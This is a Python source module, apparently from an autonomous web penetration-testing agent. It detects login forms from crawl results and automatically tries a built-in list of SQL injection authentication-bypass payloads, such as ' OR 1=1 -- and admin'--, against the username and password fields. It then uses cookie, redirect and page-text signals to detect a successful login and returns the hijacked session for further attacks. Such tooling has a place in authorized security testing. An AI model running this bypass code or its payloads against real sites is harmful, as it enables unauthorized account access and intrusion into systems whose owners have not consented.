"""Authentication Bypass Discovery — finds and exploits login bypass vulns.

When the agent runs in unauthenticated mode (no --attacker-cookie etc.),
this module kicks in after crawling to:
  1. Find login forms in the crawl results
  2. Try common SQLi bypass payloads against username/password fields
  3. Detect successful authentication (session cookies, dashboard redirects)
  4. Return the obtained session so the orchestrator can upgrade

This gives the agent the ability to discover and exploit auth bypass
vulnerabilities autonomously — exactly like a real pentester would try
`' OR 1=1 --` on a login form before doing anything else.

Detection of successful login (3-signal approach):
  - New session cookies set (Set-Cookie with session-like names)
  - Redirect to an authenticated area (dashboard, home, profile, admin)
  - Response body changes significantly (no "invalid" / "error" messages,
    or contains authenticated-area indicators like "logout", "welcome")
"""
from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin, urlparse

from ..http import HttpClient, Session
from .crawler import CrawlResult, DiscoveredForm

logger = logging.getLogger(__name__)


# ── Login form detection ─────────────────────────────────────

# Field names that indicate a username/email input
_USERNAME_FIELDS = re.compile(
    r"^(?:user(?:name|id|_name)?|login|email|e-?mail|uid|"
    r"uname|account|acct|log|usr|identity|j_username|"
    r"signin-email|txtUserName|txtUser|txtLogin|"
    r"ctl00.*(?:user|login|email))$",
    re.IGNORECASE,
)

# Field names that indicate a password input
_PASSWORD_FIELDS = re.compile(
    r"^(?:pass(?:word|wd|_word)?|pwd|secret|pin|"
    r"passwd|passw|j_password|"
    r"txtPassword|txtPass|signin-password|"
    r"ctl00.*(?:pass|pwd))$",
    re.IGNORECASE,
)

# URL patterns that suggest a login page
_LOGIN_URL_PATTERNS = re.compile(
    r"(?:login|signin|sign-in|auth|authenticate|logon|"
    r"signon|sign-on|j_security_check|doLogin|"
    r"account/login|user/login|session/new)",
    re.IGNORECASE,
)

# Session-like cookie names
_SESSION_COOKIES = re.compile(
    r"(?:sess(?:ion)?|sid|jsession|phpsess|asp\.net_session|"
    r"token|auth|jwt|access_token|id_token|_session|"
    r"connect\.sid|laravel_session|XSRF-TOKEN|csrf)",
    re.IGNORECASE,
)

# Authenticated area indicators in redirect URLs
_AUTH_REDIRECT_PATTERNS = re.compile(
    r"(?:dashboard|home|profile|admin|panel|account|"
    r"welcome|main|index|default|portal|overview|"
    r"myaccount|my-account|settings|console)",
    re.IGNORECASE,
)

# Failed login indicators in response body
_LOGIN_FAILURE_PATTERNS = re.compile(
    r"(?:invalid|incorrect|wrong|failed|error|denied|"
    r"bad\s+(?:user|pass|login|credentials)|"
    r"authentication\s+failed|login\s+failed|"
    r"try\s+again|does\s+not\s+match|"
    r"unknown\s+user|no\s+such\s+user|"
    r"account\s+not\s+found|"
    r"(?:user|email)\s+(?:not\s+found|doesn.*exist))",
    re.IGNORECASE,
)

# Successful login indicators in response body
_LOGIN_SUCCESS_PATTERNS = re.compile(
    r"(?:logout|sign\s*out|log\s*out|welcome|"
    r"my\s*account|dashboard|profile|"
    r"you\s+(?:are|have)\s+(?:logged|signed)\s+in|"
    r"successfully\s+(?:logged|signed))",
    re.IGNORECASE,
)


# ── SQLi bypass payloads ─────────────────────────────────────

# Ordered by likelihood of working, from most common to exotic.
# Each is (username_payload, password_payload, technique_name).
_BYPASS_PAYLOADS: list[tuple[str, str, str]] = [
    # Classic OR-based
    ("' OR '1'='1' --", "anything", "classic_or_1"),
    ("' OR 1=1 --", "anything", "classic_or_2"),
    ("admin' --", "anything", "comment_after_user"),
    ("admin'--", "anything", "comment_no_space"),
    # Double-dash comment variations
    ("' OR '1'='1'--", "anything", "or_no_space_comment"),
    ("' OR '1'='1'#", "anything", "or_hash_comment"),
    ("' OR 1=1#", "anything", "or_hash_simple"),
    # Admin account targeting
    ("admin' OR '1'='1", "anything", "admin_or"),
    ("admin' OR '1'='1' --", "anything", "admin_or_comment"),
    ("admin' OR '1'='1'#", "anything", "admin_or_hash"),
    # UNION-based (less common for login bypass, but works on some)
    ("' UNION SELECT 1,1 --", "anything", "union_select"),
    # Bypass with password field
    ("admin", "' OR '1'='1' --", "password_sqli"),
    ("admin", "' OR 1=1 --", "password_sqli_simple"),
    # Double-quote variants
    ('" OR "1"="1" --', "anything", "double_quote_or"),
    ('" OR 1=1 --', "anything", "double_quote_simple"),
    # Parenthesis-based (for apps with queries like WHERE (user='x'))
    ("') OR ('1'='1' --", "anything", "paren_or"),
    ("') OR 1=1 --", "anything", "paren_simple"),
    # Blind/boolean (some apps check if query returns rows)
    ("' OR 'x'='x", "' OR 'x'='x", "both_fields_or"),
    # Microsoft SQL Server specific
    ("' OR 1=1;--", "anything", "mssql_semicolon"),
    # No-quote numeric injection (rare login forms with numeric user IDs)
    ("1 OR 1=1 --", "anything", "numeric_or"),
]


# ── Data classes ──────────────────────────────────────────────


@dataclass
class LoginForm:
    """A discovered login form with its field mapping."""
    url: str                    # form action URL
    source_page: str            # page where the form was found
    method: str = "POST"
    username_field: str = ""    # field name for username/email
    password_field: str = ""    # field name for password
    extra_fields: dict[str, str] = field(default_factory=dict)  # hidden fields, CSRF tokens
    confidence: float = 0.0     # how sure we are this is a login form


@dataclass
class BypassResult:
    """Result of a successful authentication bypass."""
    login_url: str
    technique: str              # which payload worked
    payload_username: str
    payload_password: str
    session: Session            # the obtained authenticated session
    evidence: dict = field(default_factory=dict)
    confidence: str = "high"    # high / medium


# ── Auth Bypass Discovery ─────────────────────────────────────


class AuthBypassDiscovery:
    """Discovers login forms and attempts SQLi bypass.

    Designed to run after the crawler has found forms, so it doesn't
    need to do its own crawling — it inspects the CrawlResult.

    Usage:
        discovery = AuthBypassDiscovery(client)
        result = await discovery.run(crawl_result, target_url)
        if result:
            # Upgrade the attacker session
            config.attacker_session = result.session
    """

    def __init__(self, client: HttpClient, *, max_attempts_per_form: int = 20):
        self.client = client
        self.max_attempts = max_attempts_per_form

    async def run(
        self,
        crawl_result: CrawlResult,
        target_url: str,
    ) -> BypassResult | None:
        """Find login forms and attempt SQLi bypass on each.

        Returns the first successful bypass, or None if all fail.
        """
        # Step 1: Find login forms
        login_forms = self._find_login_forms(crawl_result, target_url)
        if not login_forms:
            logger.info("Auth bypass: no login forms found")
            return None

        logger.info("Auth bypass: found %d login form(s), attempting bypass",
                     len(login_forms))

        # Step 2: Try bypass on each form (highest confidence first)
        login_forms.sort(key=lambda f: f.confidence, reverse=True)

        for form in login_forms:
            logger.info("Auth bypass: trying %s (user_field=%s, pass_field=%s)",
                        form.url, form.username_field, form.password_field)

            result = await self._try_bypass(form, target_url)
            if result:
                logger.info(
                    "AUTH BYPASS SUCCESS on %s using technique '%s'",
                    form.url, result.technique,
                )
                return result

        logger.info("Auth bypass: no bypass found across %d form(s)",
                     len(login_forms))
        return None

    # ── Login form detection ─────────────────────────────────

    def _find_login_forms(
        self,
        crawl_result: CrawlResult,
        target_url: str,
    ) -> list[LoginForm]:
        """Extract login forms from crawl results."""
        login_forms: list[LoginForm] = []

        for page in crawl_result.pages:
            if page.is_soft_404:
                continue
            for form in page.forms:
                login_form = self._classify_as_login(form, page.url)
                if login_form:
                    login_forms.append(login_form)

        # Deduplicate by action URL
        seen: set[str] = set()
        unique: list[LoginForm] = []
        for lf in login_forms:
            if lf.url not in seen:
                seen.add(lf.url)
                unique.append(lf)

        return unique

    def _classify_as_login(
        self,
        form: DiscoveredForm,
        page_url: str,
    ) -> LoginForm | None:
        """Determine if a crawled form is a login form.

        Checks: field names, URL patterns, field count, presence of
        password-type inputs.
        """
        username_field = ""
        password_field = ""
        extra_fields: dict[str, str] = {}
        confidence = 0.0

        # Check each form field (FormField dataclass: .name, .input_type)
        for f in form.fields:
            name = f.name or ""
            ftype = (f.input_type or "text").lower()

            if not name:
                continue

            # Password field detection
            if ftype == "password" or _PASSWORD_FIELDS.match(name):
                password_field = name
                confidence += 0.3

            # Username field detection
            elif ftype == "email" or _USERNAME_FIELDS.match(name):
                username_field = name
                confidence += 0.3

            # Hidden fields (CSRF tokens, etc.) — keep them for replay
            elif ftype == "hidden":
                extra_fields[name] = ""

            # Submit button — skip
            elif ftype in ("submit", "button", "image"):
                continue

        # URL pattern bonus
        action_url = form.action or page_url
        if _LOGIN_URL_PATTERNS.search(action_url):
            confidence += 0.2
        if _LOGIN_URL_PATTERNS.search(page_url):
            confidence += 0.1

        # Must have both username and password fields
        if not username_field or not password_field:
            # Try harder: if there's a password field but no obvious username,
            # the first text/email field is probably the username
            if password_field and not username_field:
                for f in form.fields:
                    name = f.name or ""
                    ftype = (f.input_type or "text").lower()
                    if name and ftype in ("text", "email", "tel") and name != password_field:
                        username_field = name
                        confidence += 0.1
                        break

            if not username_field or not password_field:
                return None

        # Low-field-count forms are more likely login forms (2-5 visible fields)
        visible_fields = sum(
            1 for f in form.fields
            if (f.input_type or "text").lower() not in ("hidden", "submit", "button", "image")
        )
        if 2 <= visible_fields <= 5:
            confidence += 0.1

        if confidence < 0.3:
            return None

        return LoginForm(
            url=action_url,
            source_page=page_url,
            method=form.method.upper(),
            username_field=username_field,
            password_field=password_field,
            extra_fields=extra_fields,
            confidence=min(confidence, 1.0),
        )

    # ── Bypass attempts ──────────────────────────────────────

    async def _try_bypass(
        self,
        form: LoginForm,
        target_url: str,
    ) -> BypassResult | None:
        """Try all bypass payloads against a single login form."""

        # First, get a baseline — submit the form with wrong creds
        # to understand what a failed login looks like
        baseline = await self._submit_login(
            form, "not_a_real_user_xyzzy", "not_a_real_pass_xyzzy",
        )
        if baseline is None:
            return None

        baseline_cookies = set(baseline.get("cookies", {}).keys())
        baseline_status = baseline.get("status", 0)
        baseline_location = baseline.get("location", "")
        baseline_body = baseline.get("body", "")

        attempts = 0
        for user_payload, pass_payload, technique in _BYPASS_PAYLOADS:
            if attempts >= self.max_attempts:
                break
            attempts += 1

            result = await self._submit_login(form, user_payload, pass_payload)
            if result is None:
                continue

            # Compare against baseline to detect successful login
            success, evidence = self._detect_success(
                result, baseline_cookies, baseline_status,
                baseline_location, baseline_body, target_url,
            )

            if success:
                # Build a Session from the obtained cookies/headers
                session = Session(
                    cookies=result.get("cookies", {}),
                )

                return BypassResult(
                    login_url=form.url,
                    technique=technique,
                    payload_username=user_payload,
                    payload_password=pass_payload,
                    session=session,
                    evidence={
                        "technique": technique,
                        "login_url": form.url,
                        "username_field": form.username_field,
                        "password_field": form.password_field,
                        "payload_username": user_payload,
                        "payload_password": pass_payload,
                        "response_status": result.get("status"),
                        "status_code": result.get("status"),
                        "redirect_to": result.get("location", ""),
                        "new_cookies": list(result.get("cookies", {}).keys()),
                        "success_signals": evidence,
                        "uid_field": form.username_field,
                        "pw_field": form.password_field,
                        "response_body": result.get("body", "")[:2000],
                        "full_request": result.get("full_request", ""),
                        "full_response": result.get("full_response", ""),
                    },
                    confidence="high" if len(evidence) >= 2 else "medium",
                )

        return None

    async def _submit_login(
        self,
        form: LoginForm,
        username: str,
        password: str,
    ) -> dict | None:
        """Submit the login form with given credentials.

        Returns a dict with status, headers, cookies, body, location.
        """
        data = dict(form.extra_fields)  # hidden fields (CSRF tokens etc.)
        data[form.username_field] = username
        data[form.password_field] = password

        try:
            # Use a bare session (no auth) to simulate unauthenticated login
            empty_session = Session()

            # IMPORTANT: httpx uses follow_redirects, NOT allow_redirects.
            # We disable redirects so we can see the 302 + Set-Cookie + Location.
            if form.method == "GET":
                resp = await self.client.request(
                    "GET", form.url, session=empty_session,
                    params=data,
                    follow_redirects=False,
                )
            else:
                resp = await self.client.request(
                    "POST", form.url, session=empty_session,
                    data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=False,
                )

            # Extract cookies from the response.
            # httpx.Response.cookies is a Cookies jar that properly parses
            # all Set-Cookie headers — much more reliable than raw header parsing.
            cookies = {}
            if hasattr(resp, "cookies") and resp.cookies:
                for name, value in resp.cookies.items():
                    cookies[name] = value

            # Fallback: also parse raw Set-Cookie headers in case httpx
            # cookies jar missed any (e.g. malformed cookies)
            for raw in resp.headers.multi_items():
                if raw[0].lower() == "set-cookie" and "=" in raw[1]:
                    parts = raw[1].split(";")[0].strip()
                    name, _, value = parts.partition("=")
                    if name.strip() and name.strip() not in cookies:
                        cookies[name.strip()] = value.strip()

            # If we got a redirect, also follow it once to capture any
            # cookies set on the redirect target (e.g. dashboard page)
            location = resp.headers.get("location", "")
            body = ""
            if 300 <= resp.status_code < 400 and location:
                redirect_url = urljoin(form.url, location)
                try:
                    redirect_session = Session(cookies=dict(cookies))
                    redir_resp = await self.client.request(
                        "GET", redirect_url, session=redirect_session,
                        follow_redirects=False,
                    )
                    body = redir_resp.text[:5000] if redir_resp.text else ""
                    # Collect any additional cookies from the redirect
                    if hasattr(redir_resp, "cookies") and redir_resp.cookies:
                        for name, value in redir_resp.cookies.items():
                            cookies[name] = value
                except Exception:
                    pass  # redirect follow is best-effort
            else:
                body = resp.text[:5000] if resp.text else ""

            # Capture exact HTTP request/response for reports
            parsed_url = urlparse(str(resp.request.url))
            req_lines = [f"{resp.request.method} {parsed_url.path or '/'} HTTP/1.1"]
            req_lines.append(f"Host: {parsed_url.hostname}")
            req_lines.append("Content-Type: application/x-www-form-urlencoded")
            req_body = resp.request.content.decode("utf-8", errors="replace") if resp.request.content else ""
            if req_body:
                req_lines.append(f"Content-Length: {len(req_body)}")
                req_lines.append("")
                req_lines.append(req_body)
            full_request = "\n".join(req_lines)

            resp_lines = [f"HTTP/1.1 {resp.status_code}"]
            for h_name, h_value in resp.headers.items():
                if h_name.lower() in ("location", "set-cookie", "content-type", "server"):
                    resp_lines.append(f"{h_name}: {h_value}")
            resp_lines.append("")
            resp_lines.append(body[:2000] if body else "")
            full_response = "\n".join(resp_lines)

            return {
                "status": resp.status_code,
                "location": location,
                "cookies": cookies,
                "body": body,
                "full_request": full_request,
                "full_response": full_response,
            }

        except Exception as exc:
            logger.debug("Auth bypass: request to %s failed: %s", form.url, exc)
            return None

    # ── Success detection ────────────────────────────────────

    def _detect_success(
        self,
        result: dict,
        baseline_cookies: set[str],
        baseline_status: int,
        baseline_location: str,
        baseline_body: str,
        target_url: str,
    ) -> tuple[bool, list[str]]:
        """Determine if the login attempt succeeded.

        Uses a 3-signal approach — at least 2 signals required:
          1. New session cookies appeared that weren't in baseline
          2. Redirect to an authenticated area (different from baseline)
          3. Body content indicates success (no failure messages, has success markers)

        Returns (is_success, list_of_signals).
        """
        signals: list[str] = []

        status = result.get("status", 0)
        location = result.get("location", "")
        cookies = result.get("cookies", {})
        body = result.get("body", "")

        # Signal 1: New session-like cookies
        new_cookies = set(cookies.keys()) - baseline_cookies
        session_cookies = [c for c in new_cookies if _SESSION_COOKIES.search(c)]
        if session_cookies:
            signals.append(f"new_session_cookies: {', '.join(session_cookies)}")

        # Even if the cookie name is the same, check if value changed significantly
        # (baseline had empty/short cookie, now it's a real session)
        if not session_cookies:
            for name in cookies:
                if _SESSION_COOKIES.search(name) and len(cookies[name]) > 10:
                    signals.append(f"session_cookie_value_set: {name}")
                    break

        # Signal 2: Redirect to authenticated area
        if 300 <= status < 400 and location:
            # Check if redirect goes to an authenticated-looking URL
            if _AUTH_REDIRECT_PATTERNS.search(location):
                signals.append(f"auth_redirect: {location}")
            # Or: redirect is DIFFERENT from baseline (baseline might redirect
            # back to login, success redirects elsewhere)
            elif location != baseline_location and baseline_location:
                # Make sure it's not redirecting back to login
                if not _LOGIN_URL_PATTERNS.search(location):
                    signals.append(f"different_redirect: {location}")

        # Signal 3: Body content analysis
        if body:
            has_failure = bool(_LOGIN_FAILURE_PATTERNS.search(body))
            has_success = bool(_LOGIN_SUCCESS_PATTERNS.search(body))
            baseline_had_failure = bool(_LOGIN_FAILURE_PATTERNS.search(baseline_body))

            # Success: baseline had failure messages, this one doesn't
            if baseline_had_failure and not has_failure:
                signals.append("no_error_message")

            # Success: explicit success markers
            if has_success and not has_failure:
                signals.append("success_markers_in_body")

            # Success: significantly different response body
            if baseline_body and body:
                # Simple length-based heuristic: if body is 50%+ different in size
                len_diff = abs(len(body) - len(baseline_body))
                avg_len = (len(body) + len(baseline_body)) / 2
                if avg_len > 0 and len_diff / avg_len > 0.5:
                    signals.append("body_significantly_different")

        # Need at least 1 signal to consider it a success.
        # 2+ signals = high confidence, 1 signal = medium confidence.
        # A single "body_significantly_different" alone is not enough —
        # that can trigger on error pages or WAF blocks.
        if len(signals) == 1 and signals[0] == "body_significantly_different":
            return False, signals

        is_success = len(signals) >= 1
        return is_success, signals
